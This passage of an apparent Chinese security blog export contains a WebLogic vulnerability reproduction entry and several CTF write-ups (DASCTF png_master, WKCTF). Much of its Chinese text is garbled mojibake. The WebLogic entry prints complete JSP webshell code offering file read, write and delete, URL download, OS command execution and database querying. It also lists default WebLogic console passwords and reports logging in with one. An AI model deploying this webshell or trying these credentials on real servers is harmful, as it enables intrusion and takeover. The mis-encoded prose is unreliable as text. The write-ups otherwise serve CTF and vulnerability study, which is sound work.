class="string">&quot;/&quot;</span> + z[j].getName(), d + <span class="string">&quot;/&quot;</span> + z[j].getName());&#125;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            FileInputStream <span class="keyword">is</span> = new FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = new FileOutputStream(df);</span><br><span class="line">            <span class="built_in">int</span> n;</span><br><span class="line">            byte[] b = new byte[<span class="number">512</span>];<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(b, <span class="number">0</span>, n);&#125;<span class="keyword">is</span>.close();</span><br><span class="line">            os.close();&#125;&#125;void II(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);</span><br><span class="line">        sf.renameTo(df);&#125;void JJ(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.mkdir();&#125;void KK(String s, String t) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());&#125;void LL(String s, String d) throws Exception &#123;</span><br><span class="line">        URL u = new URL(s);</span><br><span class="line">        <span class="built_in">int</span> n = <span class="number">0</span>;</span><br><span class="line">        FileOutputStream os = new FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream <span class="keyword">is</span> = h.getInputStream();</span><br><span class="line">        byte[] b = new byte[<span class="number">512</span>];<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);&#125;</span><br><span class="line">        os.close();<span class="keyword">is</span>.close();</span><br><span class="line">        h.disconnect();&#125;void MM(InputStream <span class="keyword">is</span>, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(<span class="keyword">is</span>));<span class="keyword">while</span> ((l = br.readLine()) != null) &#123;</span><br><span class="line">            sb.append(l + <span class="string">&quot;\r\n&quot;</span>);&#125;&#125;void NN(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = s.indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="number">1</span>) + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();&#125;void OO(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;choraheiheihei&quot;</span>);</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(null,s.indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>?x.length&gt;<span class="number">5</span>?x[<span class="number">5</span>]:x[<span class="number">4</span>]:null, <span class="string">&quot;%&quot;</span>, new String[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="string">&quot;TABLE_NAME&quot;</span>) + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();&#125;void PP(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1007</span>);</span><br><span class="line">        ResultSet r = m.executeQuery(<span class="string">&quot;select * from &quot;</span> + x[x.length-<span class="number">1</span>]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + <span class="string">&quot; (&quot;</span> + d.getColumnTypeName(i)+ <span class="string">&quot;)\t&quot;</span>);&#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();&#125;void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception &#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1008</span>);</span><br><span class="line">        BufferedWriter bw = null;<span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>?q.substring(<span class="number">0</span>,q.indexOf(<span class="string">&quot;--f:&quot;</span>)):q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            <span class="built_in">int</span> n = d.getColumnCount();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + <span class="string">&quot;\t|\t&quot;</span>);&#125;</span><br><span class="line">            sb.append(<span class="string">&quot;\r\n&quot;</span>);<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                File file = new File(p);<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;-to:&quot;</span>)==-<span class="number">1</span>)&#123;</span><br><span class="line">                    file.mkdir();&#125;</span><br><span class="line">                bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(<span class="string">&quot;-to:&quot;</span>)!=-<span class="number">1</span>?p.trim():p+q.substring(q.indexOf(<span class="string">&quot;--f:&quot;</span>) + <span class="number">4</span>,q.length()).trim()),true),cs));&#125;<span class="keyword">while</span> (r.<span class="built_in">next</span>()) &#123;<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;<span class="keyword">if</span>(q.indexOf(<span class="string">&quot;--f:&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bw.write(r.getObject(i)+<span class="string">&quot;&quot;</span>+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                        bw.flush();&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        sb.append(r.getObject(i)+<span class="string">&quot;&quot;</span> + <span class="string">&quot;\t|\t&quot;</span>);&#125;&#125;<span class="keyword">if</span>(bw!=null)&#123;bw.newLine();&#125;</span><br><span class="line">                sb.append(<span class="string">&quot;\r\n&quot;</span>);&#125;</span><br><span class="line">            r.close();<span class="keyword">if</span>(bw!=null)&#123;bw.close();&#125;&#125; catch (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Result\t|\t\r\n&quot;</span>);<span class="keyword">try</span> &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(<span class="string">&quot;Execute Successfully!\t|\t\r\n&quot;</span>);&#125; catch (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + <span class="string">&quot;\t|\t\r\n&quot;</span>);&#125;&#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();&#125;%&gt;&lt;%//String Z = EC(request.getParameter(Pwd) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    </span><br><span class="line">    cs = request.getParameter(<span class="string">&quot;code&quot;</span>) != null ? request.getParameter(<span class="string">&quot;code&quot;</span>)+ <span class="string">&quot;&quot;</span>:cs;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(<span class="string">&quot;text/html;charset=&quot;</span> + cs);</span><br><span class="line">    StringBuffer sb = new StringBuffer(<span class="string">&quot;&quot;</span>);<span class="keyword">if</span> (request.getParameter(Pwd) != null) &#123;<span class="keyword">try</span> &#123;</span><br><span class="line">        String Z = EC(request.getParameter(<span class="string">&quot;action&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        String z1 = EC(request.getParameter(<span class="string">&quot;z1&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        String z2 = EC(request.getParameter(<span class="string">&quot;z2&quot;</span>) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>);</span><br><span class="line">        String s = request.getSession().getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>);<span class="keyword">if</span> (Z.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            sb.append(s + <span class="string">&quot;\t&quot;</span>);<span class="keyword">if</span> (!s.substring(<span class="number">0</span>, <span class="number">1</span>).equals(<span class="string">&quot;/&quot;</span>)) &#123;AA(sb);&#125;&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;B&quot;</span>)) &#123;BB(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">            String l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));<span class="keyword">while</span> ((l = br.readLine()) != null) &#123;</span><br><span class="line">                sb.append(l + <span class="string">&quot;\r\n&quot;</span>);&#125;</span><br><span class="line">            br.close();&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;D&quot;</span>)) &#123;</span><br><span class="line">            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;E&quot;</span>)) &#123;EE(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;F&quot;</span>)) &#123;FF(z1, response);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;G&quot;</span>)) &#123;GG(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;H&quot;</span>)) &#123;HH(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;I&quot;</span>)) &#123;II(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;J&quot;</span>)) &#123;JJ(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;K&quot;</span>)) &#123;KK(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;L&quot;</span>)) &#123;LL(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;M&quot;</span>)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(<span class="number">2</span>), z1.substring(<span class="number">0</span>, <span class="number">2</span>), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().<span class="built_in">exec</span>(c);MM(p.getInputStream(), sb);MM(p.getErrorStream(), sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;N&quot;</span>)) &#123;NN(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;O&quot;</span>)) &#123;OO(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;P&quot;</span>)) &#123;PP(z1, sb);&#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;Q&quot;</span>)) &#123;QQ(cs, z1, z2, sb,z2.indexOf(<span class="string">&quot;-to:&quot;</span>)!=-<span class="number">1</span>?z2.substring(z2.indexOf(<span class="string">&quot;-to:&quot;</span>)+<span class="number">4</span>,z2.length()):s.replaceAll(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;/&quot;</span>)+<span class="string">&quot;images/&quot;</span>);&#125;&#125; catch (Exception e) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;ERROR&quot;</span> + <span class="string">&quot;:// &quot;</span> + e.toString());&#125;</span><br><span class="line">    sb.append(<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>);</span><br><span class="line">    out.<span class="built_in">print</span>(sb.toString());&#125;%&gt;</span><br></pre></td></tr></table></figure><h3 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h3><p>æ¼æ´è¯¦æƒ…ï¼šç”±äºç®¡ç†å‘˜çš„ç–å¿½ï¼Œæœ‰å¯èƒ½ä¼šè®¾ç½®ä¸€äº›å¼±å£ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å¸¸è§çš„å£ä»¤çŒœè§£è¿›å…¥åå°ï¼Œå†é€šè¿‡åå°getshell</p><p>è®¿é—®åå°åœ°å€<a href="http://your-ip:7001/console">http://your-ip:7001/console</a></p><p>å¸¸è§çš„weblogicçš„å£ä»¤</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:secruity</span><br><span class="line">joe:password</span><br><span class="line">mary:password</span><br><span class="line">system:sercurity</span><br><span class="line">wlcsystem: wlcsystem</span><br><span class="line">weblogic:Oracle@<span class="number">123</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡æµ‹è¯•ï¼šweblogic:Oracle@123ï¼ŒæˆåŠŸç™»å½•</p><p><img src="/img/1721567330384-13.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/2024/07/21/DASCTF/"/>
      <url>/2024/07/21/DASCTF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="png-master"><a href="#png-master" class="headerlink" title="png_master"></a>png_master</h3><p>part1ï¼š010å‘ç°æ–‡ä»¶æœ«å°¾æœ‰base64</p><p><img src="/img/1721568082484-37.png" alt="img"></p><p>cyberchefè§£å¯†å¾—</p><p>flag1:DASCTF{2fd9e9ff-e27</p><p>part2ï¼šstegsolveé‡Œå‘ç°</p><p><img src="/img/1721568082484-38.png" alt="img"></p><p>flag2ï¼šd-5405-c5f5-</p><p>part3ï¼šæ£€æŸ¥ä¸€ä¸‹pngIDATå—çš„ä¿¡æ¯</p><p>å…³äºIDATéšå†™å°±åœ¨æ­¤å¤„ä»‹ç»ä¸€ä¸‹</p><p>IDATæœ‰<strong>å›ºå®šçš„é•¿åº¦</strong>ï¼Œæ­£å¸¸çš„<strong>PNGå›¾ç‰‡</strong>åªæœ‰æœ€åä¸€ä¸ªIDATå—çš„é•¿åº¦æ˜¯æ¯”å…¶ä»–çš„è¦çŸ­çš„ï¼Œåœ¨æ­¤å¤„å¾ˆæ˜æ˜¾çš„58674æ˜¯æœ€åä¸€ä¸ªIDATæ¨¡å—ï¼Œä½†æ˜¯åé¢ä»ç„¶å¤šäº†ä¸€ä¸ªIDAT,è¿™æ˜¯å¤šä½™çš„ï¼Œå¯ä»¥ç”¨binwalkæ£€æµ‹ä¸€ä¸‹ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥å‘ç°ä»–å…¶å®æ˜¯æœ‰2ä¸ªzlibï¼Œæœ‰å‡ ä¸ªzlibä»£è¡¨æœ‰å‡ å¼ pngå›¾ç‰‡ï¼Œå¯ä»¥æµ…æµ…çš„è¿™æ ·ç†è§£ä¸€ä¸‹</p><p>ä¸€èˆ¬è§£é¢˜æ€è·¯ï¼šå°†æœ€åçš„ä¸€ä¸ªIDATæ¨¡å—è§£å‹æå–å‡ºæ¥ï¼Œå› ä¸ºè¿™é‡Œæœ‰å‡ºé¢˜äººæ‰€éšè—çš„ä¿¡æ¯ï¼Œçœ‹äº†ç½‘ä¸Šä¸€ä¸ªé¢˜çš„è§£é¢˜æ€è·¯æ˜¯å°†å…¶IDATçš„æ•°æ®æå–å‡ºæ¥è½¬äºŒè¿›åˆ¶ï¼Œè¿›è¡ŒäºŒç»´ç ç»˜å›¾ï¼Œæ‰«ç å³å¯å¾—flagï¼Œåœ¨è¿™é‡Œå°±ä¸å†æ¼”ç¤ºäº†</p><p><img src="/img/1721568082485-39.png" alt="img"></p><p>å‘ç°é•¿åº¦ä¸º3394çš„æ¨¡å—å¼‚å¸¸ï¼ŒåŠ ä¸ŠåŸæ–‡ä»¶çš„å¤´å°¾ï¼ŒCRCçˆ†ç ´</p><p><img src="/img/1722310466870-1.png" alt="img"></p><p>æœ€åä¸€æ®µflagä¸ºa19131f86126}</p><p>DASCTF{2fd9e9ff-e27d-5405-c5f5-a19131f86126}</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WKCTF</title>
      <link href="/2024/07/21/WKCTF/"/>
      <url>/2024/07/21/WKCTF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>twinhexç¼–ç è§£ç ï¼Œå¾—åˆ°base64ç¼–ç ï¼Œä»æ ¼å¼çœ‹å‡ºæ˜¯å›¾â½šè½¬äº†base64ï¼Œäºæ˜¯â½¤åœ¨çº¿Base64è½¬å›¾â½šæ¢å¤å›¾â½šï¼Œæ˜¯ä¸ªâ¼†ç»´ç ï¼Œæ‰«æå¾—åˆ°è¦å‘é€WKCTF2024åˆ°å…¬ä¼—å·è·å–flagã€‚</p><h3 id="å°zçš„ç¤¾äº¤ç½‘ç»œ"><a href="#å°zçš„ç¤¾äº¤ç½‘ç»œ" class="headerlink" title="å°zçš„ç¤¾äº¤ç½‘ç»œ"></a>å°zçš„ç¤¾äº¤ç½‘ç»œ</h3><p>é¢˜ç›®æ˜¾ç¤ºçš„æ˜¯AESçš„ecbåŠ å¯†æ–¹å¼ï¼Œè¿™é‡Œç»™çš„æ˜¯ä¸€å¼ ppmå›¾ç‰‡ï¼Œå›¾ç‰‡æ ¼å¼å·²ç»æŸå ï¼Œæ ¹æ®ElectronicColoringBookå¯ä»¥å¯¹å…¶è¿›è¡Œæ¢å¤</p><p><img src="/img/1721553107561-4.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python ElectronicColoringBook.py <span class="built_in">id</span>.ppm --blocksize=<span class="number">3</span> -p <span class="number">3</span> -o <span class="number">10</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721553107560-1.png" alt="img"></p><p>å¾—çŸ¥å…¶è´¦å·</p><p>d3d3LnppbWFibHVlLmxpZmU&#x3D; </p><p><img src="/img/1721553107560-2.png" alt="img"></p><p>ç»§ç»­åœ¨å¾®åšâ¾¥æ‰¾ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾®åšè¯´æ˜äº†å¯†ç æ˜¯â¼¥æœ‹å‹â½£â½‡ï¼Œå†åœ¨ä¸‹â¼€æ¡å¯ä»¥çœ‹åˆ°ä»–â¼¥æœ‹å‹çš„â¼©çº¢ä¹¦ </p><p>å›¾â½šâ½”å°ï¼Œæ ¹æ®â½”å°æ‰¾åˆ°å…¶è´¦å·ï¼Œç„¶ååœ¨ä¸ªâ¼ˆç®€ä»‹æ‰¾åˆ°â¼€ä¸ªbase58ç¼–ç ï¼Œè§£å¯†å‘ç°æ˜¯qqï¼Œè®¿é—®qqå¯ä»¥ </p><p>çœ‹åˆ°â½£â½‡20000917ï¼Œé‚£ä¹ˆå°±å¯ä»¥è§£å¼€åšå®¢äº†ã€‚åšå®¢æ˜¯ä¸ªæâ½°ï¼Œæâ½°è¦å»æ‰¾githubè´¦å·ã€‚  </p><p><a href="https://github.com/BeBetterCoder/WKCTF%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E8%BF%99%E9%87%8C%E4%BB%96%E8%BF%9B%E8%A1%8C%E5%88%A0%E9%99%A4%E4%BA%86flag.zip">https://github.com/BeBetterCoder/WKCTFï¼Œå¯ä»¥å‘ç°è¿™é‡Œä»–è¿›è¡Œåˆ é™¤äº†flag.zip</a></p><p><img src="/img/1721553107560-3.png" alt="img"></p><p>4.æ ¹æ®åšå®¢çš„åŸŸåç­‰ä¿¡æ¯å»gitæœç´¢ZimaBlueå¯ä»¥æ‰¾åˆ°å…¶è´¦å·ï¼Œæœ‰ä¸ªåº“å«åšWKCTFï¼Œåœ¨â¾¥â¾¯åªæœ‰ </p><p>readmeï¼Œä½†æ˜¯åœ¨commitâ¾¥å¯ä»¥çœ‹åˆ°ä¹‹å‰åˆ é™¤çš„â½‚ä»¶ï¼Œæ‰¾åˆ°flag.swpï¼Œé€šè¿‡åœ¨linuxä¸‹ vim -r FLAGå¯æ¢ </p><p>å¤â½‚ä»¶ã€‚ </p><h3 id="ä¸å¥—æ˜¯ä½ çš„è°è¨€"><a href="#ä¸å¥—æ˜¯ä½ çš„è°è¨€" class="headerlink" title="ä¸å¥—æ˜¯ä½ çš„è°è¨€"></a>ä¸å¥—æ˜¯ä½ çš„è°è¨€</h3><p>é™„ä»¶å°±ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå¦‚æœåšè¿‡pythoné€†å‘çš„è¯å¯ä»¥çœ‹å‡ºè¿™ä¸ªæ˜¯pycçš„magicå¤´ã€‚æ¯ä¸€ä¸ªmagicå¤´å¯¹åº”ç›¸åº”çš„pythonå°ç‰ˆæœ¬ã€‚å› ä¸ºæ²¡æœ‰åˆ«çš„ä¿¡æ¯ï¼Œå› æ­¤è€ƒè™‘å…ˆæŠŠæ¯ä¸ªhexè½¬æˆpythonå°ç‰ˆæœ¬è¯•è¯•çœ‹ã€‚å…³äºpyç‰ˆæœ¬å’Œmagicçš„å…³ç³»ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°ï¼Œreverseè¿‡ç¨‹çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><p>å¦‚æœå–æ¯ä¸ªpythonå°ç‰ˆæœ¬çš„æ•°å­—é‚£åˆšå¥½å°±æ˜¯0-9ï¼Œå› æ­¤è€ƒè™‘è¿™æ˜¯åè¿›åˆ¶ã€‚è¿èµ·æ¥è½¬intå†è½¬byteså¯ä»¥çœ‹å‡ºæ˜¯zipæ–‡ä»¶ã€‚è¿™ä¸ªzipæ˜¯ä¼ªåŠ å¯†ï¼Œå› æ­¤æ”¹ä¸€ä¸‹ä¸¤å¤„æ ‡å¿—ä½å¯ä»¥æ­£å¸¸è§£å‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_magic</span>(<span class="params">magic_number</span>):</span><br><span class="line">    tmp = <span class="built_in">int</span>(magic_number[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">    tmp = long_to_bytes(tmp)</span><br><span class="line">    number = <span class="built_in">int</span>.from_bytes(tmp[:<span class="number">2</span>],<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line">PYTHON_MAGIC = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3</span></span><br><span class="line">    <span class="number">3000</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3010</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3020</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3030</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3040</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3050</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3060</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3061</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3071</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3081</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3091</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3101</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3103</span>: (<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="number">3111</span>: (<span class="number">3</span>, <span class="number">0</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3131</span>: (<span class="number">3</span>, <span class="number">0</span>),  <span class="comment"># a5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.1</span></span><br><span class="line">    <span class="number">3141</span>: (<span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3151</span>: (<span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># a0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.2</span></span><br><span class="line">    <span class="number">3160</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3170</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3180</span>: (<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.3</span></span><br><span class="line">    <span class="number">3190</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3200</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3220</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3230</span>: (<span class="number">3</span>, <span class="number">3</span>),  <span class="comment"># a4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.4</span></span><br><span class="line">    <span class="number">3250</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3260</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3270</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3280</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3290</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3300</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3310</span>: (<span class="number">3</span>, <span class="number">4</span>),  <span class="comment"># rc2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.5</span></span><br><span class="line">    <span class="number">3320</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3330</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3340</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3350</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3351</span>: (<span class="number">3</span>, <span class="number">5</span>),  <span class="comment"># 3.5.2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.6</span></span><br><span class="line">    <span class="number">3360</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3361</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3370</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3371</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3372</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3373</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3375</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3376</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3377</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3378</span>: (<span 